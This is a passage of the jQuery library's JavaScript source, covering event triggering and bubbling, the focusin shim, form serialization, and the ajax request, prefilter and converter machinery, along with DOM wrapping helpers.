      trigger: function( event, data, elem, onlyHandlers ) {

          var i, cur, tmp, bubbleType, ontype, handle, special,
              eventPath = [ elem || document ],
              type = hasOwn.call( event, "type" ) ? event.type : event,
              namespaces = hasOwn.call( event, "namespace" ) ? event.namespace.split( "." ) : [];

          cur = tmp = elem = elem || document;

          // Don't do events on text and comment nodes
          if ( elem.nodeType === 3 || elem.nodeType === 8 ) {
              return;
          }

          // focus/blur morphs to focusin/out; ensure we're not firing them right now
          if ( rfocusMorph.test( type + jQuery.event.triggered ) ) {
              return;
          }

          if ( type.indexOf( "." ) > -1 ) {

              // Namespaced trigger; create a regexp to match event type in handle()
              namespaces = type.split( "." );
              type = namespaces.shift();
              namespaces.sort();
          }
          ontype = type.indexOf( ":" ) < 0 && "on" + type;

          // Caller can pass in a jQuery.Event object, Object, or just an event type string
          event = event[ jQuery.expando ] ?
              event :
              new jQuery.Event( type, typeof event === "object" && event );

          // Trigger bitmask: & 1 for native handlers; & 2 for jQuery (always true)
          event.isTrigger = onlyHandlers ? 2 : 3;
          event.namespace = namespaces.join( "." );
          event.rnamespace = event.namespace ?
              new RegExp( "(^|\\.)" + namespaces.join( "\\.(?:.*\\.|)" ) + "(\\.|$)" ) :
              null;

          // Clean up the event in case it is being reused
          event.result = undefined;
          if ( !event.target ) {
              event.target = elem;
          }

          // Clone any incoming data and prepend the event, creating the handler arg list
          data = data == null ?
              [ event ] :
              jQuery.makeArray( data, [ event ] );

          // Allow special events to draw outside the lines
          special = jQuery.event.special[ type ] || {};
          if ( !onlyHandlers && special.trigger && special.trigger.apply( elem, data ) === false ) {
              return;
          }

          // Determine event propagation path in advance, per W3C events spec (#9951)
          // Bubble up to document, then to window; watch for a global ownerDocument var (#9724)
          if ( !onlyHandlers && !special.noBubble && !jQuery.isWindow( elem ) ) {

              bubbleType = special.delegateType || type;
              if ( !rfocusMorph.test( bubbleType + type ) ) {
                  cur = cur.parentNode;
              }
              for ( ; cur; cur = cur.parentNode ) {
                  eventPath.push( cur );
                  tmp = cur;
              }

              // Only add window if we got to document (e.g., not plain obj or detached DOM)
              if ( tmp === ( elem.ownerDocument || document ) ) {
                  eventPath.push( tmp.defaultView || tmp.parentWindow || window );
              }
          }

          // Fire handlers on the event path
          i = 0;
          while ( ( cur = eventPath[ i++ ] ) && !event.isPropagationStopped() ) {

              event.type = i > 1 ?
                  bubbleType :
                  special.bindType || type;

              // jQuery handler
              handle = ( dataPriv.get( cur, "events" ) || {} )[ event.type ] &&
                  dataPriv.get( cur, "handle" );
              if ( handle ) {
                  handle.apply( cur, data );
              }

              // Native handler
              handle = ontype && cur[ ontype ];
              if ( handle && handle.apply && acceptData( cur ) ) {
                  event.result = handle.apply( cur, data );
                  if ( event.result === false ) {
                      event.preventDefault();
                  }
              }
          }
          event.type = type;

          // If nobody prevented the default action, do it now
          if ( !onlyHandlers && !event.isDefaultPrevented() ) {

              if ( ( !special._default ||
                  special._default.apply( eventPath.pop(), data ) === false ) &&
                  acceptData( elem ) ) {

                  // Call a native DOM method on the target with the same name as the event.
                  // Don't do default actions on window, that's where global variables be (#6170)
                  if ( ontype && jQuery.isFunction( elem[ type ] ) && !jQuery.isWindow( elem ) ) {

                      // Don't re-trigger an onFOO event when we call its FOO() method
                      tmp = elem[ ontype ];

                      if ( tmp ) {
                          elem[ ontype ] = null;
                      }

                      // Prevent re-triggering of the same event, since we already bubbled it above
                      jQuery.event.triggered = type;
                      elem[ type ]();
                      jQuery.event.triggered = undefined;

                      if ( tmp ) {
                          elem[ ontype ] = tmp;
                      }
                  }
              }
          }

          return event.result;
      },

      // Piggyback on a donor event to simulate a different one
      // Used only for `focus(in | out)` events
      simulate: function( type, elem, event ) {
          var e = jQuery.extend(
              new jQuery.Event(),
              event,
              {
                  type: type,
                  isSimulated: true
              }
          );

          jQuery.event.trigger( e, null, elem );
      }

  } );

  jQuery.fn.extend( {

      trigger: function( type, data ) {
          return this.each( function() {
              jQuery.event.trigger( type, data, this );
          } );
      },
      triggerHandler: function( type, data ) {
          var elem = this[ 0 ];
          if ( elem ) {
              return jQuery.event.trigger( type, data, elem, true );
          }
      }
  } );


  jQuery.each( ( "blur focus focusin focusout resize scroll click dblclick " +
      "mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave " +
      "change select submit keydown keypress keyup contextmenu" ).split( " " ),
      function( i, name ) {

      // Handle event binding
      jQuery.fn[ name ] = function( data, fn ) {
          return arguments.length > 0 ?
              this.on( name, null, data, fn ) :
              this.trigger( name );
      };
  } );

  jQuery.fn.extend( {
      hover: function( fnOver, fnOut ) {
          return this.mouseenter( fnOver ).mouseleave( fnOut || fnOver );
      }
  } );




  support.focusin = "onfocusin" in window;


  // Support: Firefox <=44
  // Firefox doesn't have focus(in | out) events
  // Related ticket - https://bugzilla.mozilla.org/show_bug.cgi?id=687787
  //
  // Support: Chrome <=48 - 49, Safari <=9.0 - 9.1
  // focus(in | out) events fire after focus & blur events,
  // which is spec violation - http://www.w3.org/TR/DOM-Level-3-Events/#events-focusevent-event-order
  // Related ticket - https://bugs.chromium.org/p/chromium/issues/detail?id=449857
  if ( !support.focusin ) {
      jQuery.each( { focus: "focusin", blur: "focusout" }, function( orig, fix ) {

          // Attach a single capturing handler on the document while someone wants focusin/focusout
          var handler = function( event ) {
              jQuery.event.simulate( fix, event.target, jQuery.event.fix( event ) );
          };

          jQuery.event.special[ fix ] = {
              setup: function() {
                  var doc = this.ownerDocument || this,
                      attaches = dataPriv.access( doc, fix );

                  if ( !attaches ) {
                      doc.addEventListener( orig, handler, true );
                  }
                  dataPriv.access( doc, fix, ( attaches || 0 ) + 1 );
              },
              teardown: function() {
                  var doc = this.ownerDocument || this,
                      attaches = dataPriv.access( doc, fix ) - 1;

                  if ( !attaches ) {
                      doc.removeEventListener( orig, handler, true );
                      dataPriv.remove( doc, fix );

                  } else {
                      dataPriv.access( doc, fix, attaches );
                  }
              }
          };
      } );
  }
  var location = window.location;

  var nonce = jQuery.now();

  var rquery = ( /\?/ );



  // Cross-browser xml parsing
  jQuery.parseXML = function( data ) {
      var xml;
      if ( !data || typeof data !== "string" ) {
          return null;
      }

      // Support: IE 9 - 11 only
      // IE throws on parseFromString with invalid input.
      try {
          xml = ( new window.DOMParser() ).parseFromString( data, "text/xml" );
      } catch ( e ) {
          xml = undefined;
      }

      if ( !xml || xml.getElementsByTagName( "parsererror" ).length ) {
          jQuery.error( "Invalid XML: " + data );
      }
      return xml;
  };


  var
      rbracket = /\[\]$/,
      rCRLF = /\r?\n/g,
      rsubmitterTypes = /^(?:submit|button|image|reset|file)$/i,
      rsubmittable = /^(?:input|select|textarea|keygen)/i;

  function buildParams( prefix, obj, traditional, add ) {
      var name;

      if ( Array.isArray( obj ) ) {

          // Serialize array item.
          jQuery.each( obj, function( i, v ) {
              if ( traditional || rbracket.test( prefix ) ) {

                  // Treat each array item as a scalar.
                  add( prefix, v );

              } else {

                  // Item is non-scalar (array or object), encode its numeric index.
                  buildParams(
                      prefix + "[" + ( typeof v === "object" && v != null ? i : "" ) + "]",
                      v,
                      traditional,
                      add
                  );
              }
          } );

      } else if ( !traditional && jQuery.type( obj ) === "object" ) {

          // Serialize object item.
          for ( name in obj ) {
              buildParams( prefix + "[" + name + "]", obj[ name ], traditional, add );
          }

      } else {

          // Serialize scalar item.
          add( prefix, obj );
      }
  }

  // Serialize an array of form elements or a set of
  // key/values into a query string
  jQuery.param = function( a, traditional ) {
      var prefix,
          s = [],
          add = function( key, valueOrFunction ) {

              // If value is a function, invoke it and use its return value
              var value = jQuery.isFunction( valueOrFunction ) ?
                  valueOrFunction() :
                  valueOrFunction;

              s[ s.length ] = encodeURIComponent( key ) + "=" +
                  encodeURIComponent( value == null ? "" : value );
          };

      // If an array was passed in, assume that it is an array of form elements.
      if ( Array.isArray( a ) || ( a.jquery && !jQuery.isPlainObject( a ) ) ) {

          // Serialize the form elements
          jQuery.each( a, function() {
              add( this.name, this.value );
          } );

      } else {

          // If traditional, encode the "old" way (the way 1.3.2 or older
          // did it), otherwise encode params recursively.
          for ( prefix in a ) {
              buildParams( prefix, a[ prefix ], traditional, add );
          }
      }

      // Return the resulting serialization
      return s.join( "&" );
  };

  jQuery.fn.extend( {
      serialize: function() {
          return jQuery.param( this.serializeArray() );
      },
      serializeArray: function() {
          return this.map( function() {

              // Can add propHook for "elements" to filter or add form elements
              var elements = jQuery.prop( this, "elements" );
              return elements ? jQuery.makeArray( elements ) : this;
          } )
          .filter( function() {
              var type = this.type;

              // Use .is( ":disabled" ) so that fieldset[disabled] works
              return this.name && !jQuery( this ).is( ":disabled" ) &&
                  rsubmittable.test( this.nodeName ) && !rsubmitterTypes.test( type ) &&
                  ( this.checked || !rcheckableType.test( type ) );
          } )
          .map( function( i, elem ) {
              var val = jQuery( this ).val();

              if ( val == null ) {
                  return null;
              }

              if ( Array.isArray( val ) ) {
                  return jQuery.map( val, function( val ) {
                      return { name: elem.name, value: val.replace( rCRLF, "\r\n" ) };
                  } );
              }

              return { name: elem.name, value: val.replace( rCRLF, "\r\n" ) };
          } ).get();
      }
  } );


  var
      r20 = /%20/g,
      rhash = /#.*$/,
      rantiCache = /([?&])_=[^&]*/,
      rheaders = /^(.*?):[ \t]*([^\r\n]*)$/mg,

      // #7653, #8125, #8152: local protocol detection
      rlocalProtocol = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
      rnoContent = /^(?:GET|HEAD)$/,
      rprotocol = /^\/\//,

      /* Prefilters
       * 1) They are useful to introduce custom dataTypes (see ajax/jsonp.js for an example)
       * 2) These are called:
       *    - BEFORE asking for a transport
       *    - AFTER param serialization (s.data is a string if s.processData is true)
       * 3) key is the dataType
       * 4) the catchall symbol "*" can be used
       * 5) execution will start with transport dataType and THEN continue down to "*" if needed
       */
      prefilters = {},

      /* Transports bindings
       * 1) key is the dataType
       * 2) the catchall symbol "*" can be used
       * 3) selection will start with transport dataType and THEN go to "*" if needed
       */
      transports = {},

      // Avoid comment-prolog char sequence (#10098); must appease lint and evade compression
      allTypes = "*/".concat( "*" ),

      // Anchor tag for parsing the document origin
      originAnchor = document.createElement( "a" );
      originAnchor.href = location.href;

  // Base "constructor" for jQuery.ajaxPrefilter and jQuery.ajaxTransport
  function addToPrefiltersOrTransports( structure ) {

      // dataTypeExpression is optional and defaults to "*"
      return function( dataTypeExpression, func ) {

          if ( typeof dataTypeExpression !== "string" ) {
              func = dataTypeExpression;
              dataTypeExpression = "*";
          }

          var dataType,
              i = 0,
              dataTypes = dataTypeExpression.toLowerCase().match( rnothtmlwhite ) || [];

          if ( jQuery.isFunction( func ) ) {

              // For each dataType in the dataTypeExpression
              while ( ( dataType = dataTypes[ i++ ] ) ) {

                  // Prepend if requested
                  if ( dataType[ 0 ] === "+" ) {
                      dataType = dataType.slice( 1 ) || "*";
                      ( structure[ dataType ] = structure[ dataType ] || [] ).unshift( func );

                  // Otherwise append
                  } else {
                      ( structure[ dataType ] = structure[ dataType ] || [] ).push( func );
                  }
              }
          }
      };
  }

  // Base inspection function for prefilters and transports
  function inspectPrefiltersOrTransports( structure, options, originalOptions, jqXHR ) {

      var inspected = {},
          seekingTransport = ( structure === transports );

      function inspect( dataType ) {
          var selected;
          inspected[ dataType ] = true;
          jQuery.each( structure[ dataType ] || [], function( _, prefilterOrFactory ) {
              var dataTypeOrTransport = prefilterOrFactory( options, originalOptions, jqXHR );
              if ( typeof dataTypeOrTransport === "string" &&
                  !seekingTransport && !inspected[ dataTypeOrTransport ] ) {

                  options.dataTypes.unshift( dataTypeOrTransport );
                  inspect( dataTypeOrTransport );
                  return false;
              } else if ( seekingTransport ) {
                  return !( selected = dataTypeOrTransport );
              }
          } );
          return selected;
      }

      return inspect( options.dataTypes[ 0 ] ) || !inspected[ "*" ] && inspect( "*" );
  }

  // A special extend for ajax options
  // that takes "flat" options (not to be deep extended)
  // Fixes #9887
  function ajaxExtend( target, src ) {
      var key, deep,
          flatOptions = jQuery.ajaxSettings.flatOptions || {};

      for ( key in src ) {
          if ( src[ key ] !== undefined ) {
              ( flatOptions[ key ] ? target : ( deep || ( deep = {} ) ) )[ key ] = src[ key ];
          }
      }
      if ( deep ) {
          jQuery.extend( true, target, deep );
      }

      return target;
  }

  /* Handles responses to an ajax request:
   * - finds the right dataType (mediates between content-type and expected dataType)
   * - returns the corresponding response
   */
  function ajaxHandleResponses( s, jqXHR, responses ) {

      var ct, type, finalDataType, firstDataType,
          contents = s.contents,
          dataTypes = s.dataTypes;

      // Remove auto dataType and get content-type in the process
      while ( dataTypes[ 0 ] === "*" ) {
          dataTypes.shift();
          if ( ct === undefined ) {
              ct = s.mimeType || jqXHR.getResponseHeader( "Content-Type" );
          }
      }

      // Check if we're dealing with a known content-type
      if ( ct ) {
          for ( type in contents ) {
              if ( contents[ type ] && contents[ type ].test( ct ) ) {
                  dataTypes.unshift( type );
                  break;
              }
          }
      }

      // Check to see if we have a response for the expected dataType
      if ( dataTypes[ 0 ] in responses ) {
          finalDataType = dataTypes[ 0 ];
      } else {

          // Try convertible dataTypes
          for ( type in responses ) {
              if ( !dataTypes[ 0 ] || s.converters[ type + " " + dataTypes[ 0 ] ] ) {
                  finalDataType = type;
                  break;
              }
              if ( !firstDataType ) {
                  firstDataType = type;
              }
          }

          // Or just use first one
          finalDataType = finalDataType || firstDataType;
      }

      // If we found a dataType
      // We add the dataType to the list if needed
      // and return the corresponding response
      if ( finalDataType ) {
          if ( finalDataType !== dataTypes[ 0 ] ) {
              dataTypes.unshift( finalDataType );
          }
          return responses[ finalDataType ];
      }
  }

  /* Chain conversions given the request and the original response
   * Also sets the responseXXX fields on the jqXHR instance
   */
  function ajaxConvert( s, response, jqXHR, isSuccess ) {
      var conv2, current, conv, tmp, prev,
          converters = {},

          // Work with a copy of dataTypes in case we need to modify it for conversion
          dataTypes = s.dataTypes.slice();

      // Create converters map with lowercased keys
      if ( dataTypes[ 1 ] ) {
          for ( conv in s.converters ) {
              converters[ conv.toLowerCase() ] = s.converters[ conv ];
          }
      }

      current = dataTypes.shift();

      // Convert to each sequential dataType
      while ( current ) {

          if ( s.responseFields[ current ] ) {
              jqXHR[ s.responseFields[ current ] ] = response;
          }

          // Apply the dataFilter if provided
          if ( !prev && isSuccess && s.dataFilter ) {
              response = s.dataFilter( response, s.dataType );
          }

          prev = current;
          current = dataTypes.shift();

          if ( current ) {

              // There's only work to do if current dataType is non-auto
              if ( current === "*" ) {

                  current = prev;

              // Convert response if prev dataType is non-auto and differs from current
              } else if ( prev !== "*" && prev !== current ) {

                  // Seek a direct converter
                  conv = converters[ prev + " " + current ] || converters[ "* " + current ];

                  // If none found, seek a pair
                  if ( !conv ) {
                      for ( conv2 in converters ) {

                          // If conv2 outputs current
                          tmp = conv2.split( " " );
                          if ( tmp[ 1 ] === current ) {

                              // If prev can be converted to accepted input
                              conv = converters[ prev + " " + tmp[ 0 ] ] ||
                                  converters[ "* " + tmp[ 0 ] ];
                              if ( conv ) {

                                  // Condense equivalence converters
                                  if ( conv === true ) {
                                      conv = converters[ conv2 ];

                                  // Otherwise, insert the intermediate dataType
                                  } else if ( converters[ conv2 ] !== true ) {
                                      current = tmp[ 0 ];
                                      dataTypes.unshift( tmp[ 1 ] );
                                  }
                                  break;
                              }
                          }
                      }
                  }

                  // Apply converter (if not an equivalence)
                  if ( conv !== true ) {

                      // Unless errors are allowed to bubble, catch and return them
                      if ( conv && s.throws ) {
                          response = conv( response );
                      } else {
                          try {
                              response = conv( response );
                          } catch ( e ) {
                              return {
                                  state: "parsererror",
                                  error: conv ? e : "No conversion from " + prev + " to " + current
                              };
                          }
                      }
                  }
              }
          }
      }

      return { state: "success", data: response };
  }

  jQuery.extend( {

      // Counter for holding the number of active queries
      active: 0,

      // Last-Modified header cache for next request
      lastModified: {},
      etag: {},

      ajaxSettings: {
          url: location.href,
          type: "GET",
          isLocal: rlocalProtocol.test( location.protocol ),
          global: true,
          processData: true,
          async: true,
          contentType: "application/x-www-form-urlencoded; charset=UTF-8",

          /*
          timeout: 0,
          data: null,
          dataType: null,
          username: null,
          password: null,
          cache: null,
          throws: false,
          traditional: false,
          headers: {},
          */

          accepts: {
              "*": allTypes,
              text: "text/plain",
              html: "text/html",
              xml: "application/xml, text/xml",
              json: "application/json, text/javascript"
          },

          contents: {
              xml: /\bxml\b/,
              html: /\bhtml/,
              json: /\bjson\b/
          },

          responseFields: {
              xml: "responseXML",
              text: "responseText",
              json: "responseJSON"
          },

          // Data converters
          // Keys separate source (or catchall "*") and destination types with a single space
          converters: {

              // Convert anything to text
              "* text": String,

              // Text to html (true = no transformation)
              "text html": true,

              // Evaluate text as a json expression
              "text json": JSON.parse,

              // Parse text as xml
              "text xml": jQuery.parseXML
          },

          // For options that shouldn't be deep extended:
          // you can add your own custom options here if
          // and when you create one that shouldn't be
          // deep extended (see ajaxExtend)
          flatOptions: {
              url: true,
              context: true
          }
      },

      // Creates a full fledged settings object into target
      // with both ajaxSettings and settings fields.
      // If target is omitted, writes into ajaxSettings.
      ajaxSetup: function( target, settings ) {
          return settings ?

              // Building a settings object
              ajaxExtend( ajaxExtend( target, jQuery.ajaxSettings ), settings ) :

              // Extending ajaxSettings
              ajaxExtend( jQuery.ajaxSettings, target );
      },

      ajaxPrefilter: addToPrefiltersOrTransports( prefilters ),
      ajaxTransport: addToPrefiltersOrTransports( transports ),

      // Main method
      ajax: function( url, options ) {

          // If url is an object, simulate pre-1.5 signature
          if ( typeof url === "object" ) {
              options = url;
              url = undefined;
          }

          // Force options to be an object
          options = options || {};

          var transport,

              // URL without anti-cache param
              cacheURL,

              // Response headers
              responseHeadersString,
              responseHeaders,

              // timeout handle
              timeoutTimer,

              // Url cleanup var
              urlAnchor,

              // Request state (becomes false upon send and true upon completion)
              completed,

              // To know if global events are to be dispatched
              fireGlobals,

              // Loop variable
              i,

              // uncached part of the url
              uncached,

              // Create the final options object
              s = jQuery.ajaxSetup( {}, options ),

              // Callbacks context
              callbackContext = s.context || s,

              // Context for global events is callbackContext if it is a DOM node or jQuery collection
              globalEventContext = s.context &&
                  ( callbackContext.nodeType || callbackContext.jquery ) ?
                      jQuery( callbackContext ) :
                      jQuery.event,

              // Deferreds
              deferred = jQuery.Deferred(),
              completeDeferred = jQuery.Callbacks( "once memory" ),

              // Status-dependent callbacks
              statusCode = s.statusCode || {},

              // Headers (they are sent all at once)
              requestHeaders = {},
              requestHeadersNames = {},

              // Default abort message
              strAbort = "canceled",

              // Fake xhr
              jqXHR = {
                  readyState: 0,

                  // Builds headers hashtable if needed
                  getResponseHeader: function( key ) {
                      var match;
                      if ( completed ) {
                          if ( !responseHeaders ) {
                              responseHeaders = {};
                              while ( ( match = rheaders.exec( responseHeadersString ) ) ) {
                                  responseHeaders[ match[ 1 ].toLowerCase() ] = match[ 2 ];
                              }
                          }
                          match = responseHeaders[ key.toLowerCase() ];
                      }
                      return match == null ? null : match;
                  },

                  // Raw string
                  getAllResponseHeaders: function() {
                      return completed ? responseHeadersString : null;
                  },

                  // Caches the header
                  setRequestHeader: function( name, value ) {
                      if ( completed == null ) {
                          name = requestHeadersNames[ name.toLowerCase() ] =
                              requestHeadersNames[ name.toLowerCase() ] || name;
                          requestHeaders[ name ] = value;
                      }
                      return this;
                  },

                  // Overrides response content-type header
                  overrideMimeType: function( type ) {
                      if ( completed == null ) {
                          s.mimeType = type;
                      }
                      return this;
                  },

                  // Status-dependent callbacks
                  statusCode: function( map ) {
                      var code;
                      if ( map ) {
                          if ( completed ) {

                              // Execute the appropriate callbacks
                              jqXHR.always( map[ jqXHR.status ] );
                          } else {

                              // Lazy-add the new callbacks in a way that preserves old ones
                              for ( code in map ) {
                                  statusCode[ code ] = [ statusCode[ code ], map[ code ] ];
                              }
                          }
                      }
                      return this;
                  },

                  // Cancel the request
                  abort: function( statusText ) {
                      var finalText = statusText || strAbort;
                      if ( transport ) {
                          transport.abort( finalText );
                      }
                      done( 0, finalText );
                      return this;
                  }
              };

          // Attach deferreds
          deferred.promise( jqXHR );

          // Add protocol if not provided (prefilters might expect it)
          // Handle falsy url in the settings object (#10093: consistency with old signature)
          // We also use the url parameter if available
          s.url = ( ( url || s.url || location.href ) + "" )
              .replace( rprotocol, location.protocol + "//" );

          // Alias method option to type as per ticket #12004
          s.type = options.method || options.type || s.method || s.type;

          // Extract dataTypes list
          s.dataTypes = ( s.dataType || "*" ).toLowerCase().match( rnothtmlwhite ) || [ "" ];

          // A cross-domain request is in order when the origin doesn't match the current origin.
          if ( s.crossDomain == null ) {
              urlAnchor = document.createElement( "a" );

              // Support: IE <=8 - 11, Edge 12 - 13
              // IE throws exception on accessing the href property if url is malformed,
              // e.g. http://example.com:80x/
              try {
                  urlAnchor.href = s.url;

                  // Support: IE <=8 - 11 only
                  // Anchor's host property isn't correctly set when s.url is relative
                  urlAnchor.href = urlAnchor.href;
                  s.crossDomain = originAnchor.protocol + "//" + originAnchor.host !==
                      urlAnchor.protocol + "//" + urlAnchor.host;
              } catch ( e ) {

                  // If there is an error parsing the URL, assume it is crossDomain,
                  // it can be rejected by the transport if it is invalid
                  s.crossDomain = true;
              }
          }

          // Convert data if not already a string
          if ( s.data && s.processData && typeof s.data !== "string" ) {
              s.data = jQuery.param( s.data, s.traditional );
          }

          // Apply prefilters
          inspectPrefiltersOrTransports( prefilters, s, options, jqXHR );

          // If request was aborted inside a prefilter, stop there
          if ( completed ) {
              return jqXHR;
          }

          // We can fire global events as of now if asked to
          // Don't fire events if jQuery.event is undefined in an AMD-usage scenario (#15118)
          fireGlobals = jQuery.event && s.global;

          // Watch for a new set of requests
          if ( fireGlobals && jQuery.active++ === 0 ) {
              jQuery.event.trigger( "ajaxStart" );
          }

          // Uppercase the type
          s.type = s.type.toUpperCase();

          // Determine if request has content
          s.hasContent = !rnoContent.test( s.type );

          // Save the URL in case we're toying with the If-Modified-Since
          // and/or If-None-Match header later on
          // Remove hash to simplify url manipulation
          cacheURL = s.url.replace( rhash, "" );

          // More options handling for requests with no content
          if ( !s.hasContent ) {

              // Remember the hash so we can put it back
              uncached = s.url.slice( cacheURL.length );

              // If data is available, append data to url
              if ( s.data ) {
                  cacheURL += ( rquery.test( cacheURL ) ? "&" : "?" ) + s.data;

                  // #9682: remove data so that it's not used in an eventual retry
                  delete s.data;
              }

              // Add or update anti-cache param if needed
              if ( s.cache === false ) {
                  cacheURL = cacheURL.replace( rantiCache, "$1" );
                  uncached = ( rquery.test( cacheURL ) ? "&" : "?" ) + "_=" + ( nonce++ ) + uncached;
              }

              // Put hash and anti-cache on the URL that will be requested (gh-1732)
              s.url = cacheURL + uncached;

          // Change '%20' to '+' if this is encoded form body content (gh-2658)
          } else if ( s.data && s.processData &&
              ( s.contentType || "" ).indexOf( "application/x-www-form-urlencoded" ) === 0 ) {
              s.data = s.data.replace( r20, "+" );
          }

          // Set the If-Modified-Since and/or If-None-Match header, if in ifModified mode.
          if ( s.ifModified ) {
              if ( jQuery.lastModified[ cacheURL ] ) {
                  jqXHR.setRequestHeader( "If-Modified-Since", jQuery.lastModified[ cacheURL ] );
              }
              if ( jQuery.etag[ cacheURL ] ) {
                  jqXHR.setRequestHeader( "If-None-Match", jQuery.etag[ cacheURL ] );
              }
          }

          // Set the correct header, if data is being sent
          if ( s.data && s.hasContent && s.contentType !== false || options.contentType ) {
              jqXHR.setRequestHeader( "Content-Type", s.contentType );
          }

          // Set the Accepts header for the server, depending on the dataType
          jqXHR.setRequestHeader(
              "Accept",
              s.dataTypes[ 0 ] && s.accepts[ s.dataTypes[ 0 ] ] ?
                  s.accepts[ s.dataTypes[ 0 ] ] +
                      ( s.dataTypes[ 0 ] !== "*" ? ", " + allTypes + "; q=0.01" : "" ) :
                  s.accepts[ "*" ]
          );

          // Check for headers option
          for ( i in s.headers ) {
              jqXHR.setRequestHeader( i, s.headers[ i ] );
          }

          // Allow custom headers/mimetypes and early abort
          if ( s.beforeSend &&
              ( s.beforeSend.call( callbackContext, jqXHR, s ) === false || completed ) ) {

              // Abort if not done already and return
              return jqXHR.abort();
          }

          // Aborting is no longer a cancellation
          strAbort = "abort";

          // Install callbacks on deferreds
          completeDeferred.add( s.complete );
          jqXHR.done( s.success );
          jqXHR.fail( s.error );

          // Get transport
          transport = inspectPrefiltersOrTransports( transports, s, options, jqXHR );

          // If no transport, we auto-abort
          if ( !transport ) {
              done( -1, "No Transport" );
          } else {
              jqXHR.readyState = 1;

              // Send global event
              if ( fireGlobals ) {
                  globalEventContext.trigger( "ajaxSend", [ jqXHR, s ] );
              }

              // If request was aborted inside ajaxSend, stop there
              if ( completed ) {
                  return jqXHR;
              }

              // Timeout
              if ( s.async && s.timeout > 0 ) {
                  timeoutTimer = window.setTimeout( function() {
                      jqXHR.abort( "timeout" );
                  }, s.timeout );
              }

              try {
                  completed = false;
                  transport.send( requestHeaders, done );
              } catch ( e ) {

                  // Rethrow post-completion exceptions
                  if ( completed ) {
                      throw e;
                  }

                  // Propagate others as results
                  done( -1, e );
              }
          }

          // Callback for when everything is done
          function done( status, nativeStatusText, responses, headers ) {
              var isSuccess, success, error, response, modified,
                  statusText = nativeStatusText;

              // Ignore repeat invocations
              if ( completed ) {
                  return;
              }

              completed = true;

              // Clear timeout if it exists
              if ( timeoutTimer ) {
                  window.clearTimeout( timeoutTimer );
              }

              // Dereference transport for early garbage collection
              // (no matter how long the jqXHR object will be used)
              transport = undefined;

              // Cache response headers
              responseHeadersString = headers || "";

              // Set readyState
              jqXHR.readyState = status > 0 ? 4 : 0;

              // Determine if successful
              isSuccess = status >= 200 && status < 300 || status === 304;

              // Get response data
              if ( responses ) {
                  response = ajaxHandleResponses( s, jqXHR, responses );
              }

              // Convert no matter what (that way responseXXX fields are always set)
              response = ajaxConvert( s, response, jqXHR, isSuccess );

              // If successful, handle type chaining
              if ( isSuccess ) {

                  // Set the If-Modified-Since and/or If-None-Match header, if in ifModified mode.
                  if ( s.ifModified ) {
                      modified = jqXHR.getResponseHeader( "Last-Modified" );
                      if ( modified ) {
                          jQuery.lastModified[ cacheURL ] = modified;
                      }
                      modified = jqXHR.getResponseHeader( "etag" );
                      if ( modified ) {
                          jQuery.etag[ cacheURL ] = modified;
                      }
                  }

                  // if no content
                  if ( status === 204 || s.type === "HEAD" ) {
                      statusText = "nocontent";

                  // if not modified
                  } else if ( status === 304 ) {
                      statusText = "notmodified";

                  // If we have data, let's convert it
                  } else {
                      statusText = response.state;
                      success = response.data;
                      error = response.error;
                      isSuccess = !error;
                  }
              } else {

                  // Extract error from statusText and normalize for non-aborts
                  error = statusText;
                  if ( status || !statusText ) {
                      statusText = "error";
                      if ( status < 0 ) {
                          status = 0;
                      }
                  }
              }

              // Set data for the fake xhr object
              jqXHR.status = status;
              jqXHR.statusText = ( nativeStatusText || statusText ) + "";

              // Success/Error
              if ( isSuccess ) {
                  deferred.resolveWith( callbackContext, [ success, statusText, jqXHR ] );
              } else {
                  deferred.rejectWith( callbackContext, [ jqXHR, statusText, error ] );
              }

              // Status-dependent callbacks
              jqXHR.statusCode( statusCode );
              statusCode = undefined;

              if ( fireGlobals ) {
                  globalEventContext.trigger( isSuccess ? "ajaxSuccess" : "ajaxError",
                      [ jqXHR, s, isSuccess ? success : error ] );
              }

              // Complete
              completeDeferred.fireWith( callbackContext, [ jqXHR, statusText ] );

              if ( fireGlobals ) {
                  globalEventContext.trigger( "ajaxComplete", [ jqXHR, s ] );

                  // Handle the global AJAX counter
                  if ( !( --jQuery.active ) ) {
                      jQuery.event.trigger( "ajaxStop" );
                  }
              }
          }

          return jqXHR;
      },

      getJSON: function( url, data, callback ) {
          return jQuery.get( url, data, callback, "json" );
      },

      getScript: function( url, callback ) {
          return jQuery.get( url, undefined, callback, "script" );
      }
  } );

  jQuery.each( [ "get", "post" ], function( i, method ) {
      jQuery[ method ] = function( url, data, callback, type ) {

          // Shift arguments if data argument was omitted
          if ( jQuery.isFunction( data ) ) {
              type = type || callback;
              callback = data;
              data = undefined;
          }

          // The url can be an options object (which then must have .url)
          return jQuery.ajax( jQuery.extend( {
              url: url,
              type: method,
              dataType: type,
              data: data,
              success: callback
          }, jQuery.isPlainObject( url ) && url ) );
      };
  } );


  jQuery._evalUrl = function( url ) {
      return jQuery.ajax( {
          url: url,

          // Make this explicit, since user can override this through ajaxSetup (#11264)
          type: "GET",
          dataType: "script",
          cache: true,
          async: false,
          global: false,
          "throws": true
      } );
  };


  jQuery.fn.extend( {
      wrapAll: function( html ) {
          var wrap;

          if ( this[ 0 ] ) {
              if ( jQuery.isFunction( html ) ) {
                  html = html.call( this[ 0 ] );
              }

              // The elements to wrap the target around
              wrap = jQuery( html, this[ 0 ].ownerDocument ).eq( 0 ).clone( true );

              if ( this[ 0 ].parentNode ) {
                  wrap.insertBefore( this[ 0 ] );
              }

              wrap.map( function() {
                  var elem = this;

                  while ( elem.firstElementChild ) {
                      elem = elem.firstElementChild;
                  }

                  return elem;
              } ).append( this );
          }

          return this;
      },

      wrapInner: function( html ) {
          if ( jQuery.isFunction( html ) ) {
              return this.each( function( i ) {
                  jQuery( this ).wrapInner( html.call( this, i ) );
              } );
          }

          return this.each( function() {
              var self = jQuery( this ),
                  contents = self.contents();

              if ( contents.length ) {
                  contents.wrapAll( html );

              } else {
                  self.append( html );
              }
          } );
      },

      wrap: function( html ) {
          var isFunction = jQuery.isFunction( html );

          return this.each( function( i ) {
              jQuery( this ).wrapAll( isFunction ? html.call( this, i ) : html );
          } );
      },

      unwrap: function( selector ) {
          this.parent( selector ).not( "body" ).each( function() {
              jQuery( this ).replaceWith( this.childNodes );
          } );
          return this;
      }
  } );


  jQuery.expr.pseudos.hidden = function( elem ) {
      return !jQuery.expr.pseudos.visible( elem );
  };
  jQuery.expr.pseudos.visible = function( elem ) {
